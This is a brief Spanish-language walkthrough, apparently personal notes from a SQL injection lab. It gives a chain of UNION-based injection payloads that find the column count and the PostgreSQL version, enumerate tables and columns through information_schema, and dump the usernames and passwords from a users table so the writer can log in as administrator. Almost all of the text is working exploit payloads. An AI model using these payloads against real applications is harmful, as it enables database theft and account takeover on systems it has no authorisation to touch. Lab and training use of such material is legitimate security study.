primero determinamos el numero de columnas 
' UNION SELECT NULL, NULL -- -

vemos la version 

' UNION SELECT NULL, VERSION() -- -

es PostgreSQL asi que tenemos que sacar la info de la tabla de users en table schema

' UNION SELECT NULL, table_name FROM information_schema.tables -- -

vemos una que es users_algoraro

despues chequeamos como se llaman sus columnas con 

' UNION SELECT NULL,column_name from information_schema.columns WHERE table_name='users_algoraro' -- -

de ahi sacamos

password_algoraro
username_algoraro
email 

' UNION SELECT username_algoraro,password_algoraro FROM users_algoraro -- -

aunque en realidad podemos escribir todo en minuscula es mas epico asi
y haciendo esto obtenemos la pass de administrator y ya podemos logearnos como el
